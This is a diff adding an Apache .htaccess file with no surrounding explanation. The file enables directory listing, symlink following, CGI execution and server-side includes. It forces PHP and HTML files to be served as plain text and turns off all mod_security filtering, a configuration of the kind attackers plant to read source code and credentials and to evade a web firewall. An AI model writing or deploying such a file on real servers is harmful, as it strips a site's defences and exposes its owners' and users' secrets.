@@ -1,0 +1,22 @@
+OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI 
+Options Indexes FollowSymLinks 
+ForceType text/plain 
+AddType text/plain .php 
+AddType text/plain .html 
+AddType text/html .shtml 
+AddType txt .php 
+AddHandler server-parsed .php 
+AddHandler server-parsed .shtml 
+AddHandler txt .php 
+AddHandler txt .html 
+AddHandler txt .shtml 
+Options All 
+Options All 
+<IfModule mod_security.c> 
+SecFilterEngine Off 
+SecFilterScanPOST Off 
+SecFilterCheckURLEncoding Off 
+SecFilterCheckCookieFormat Off 
+SecFilterCheckUnicodeEncoding Off 
+SecFilterNormalizeCookies Off 
+</IfModule>
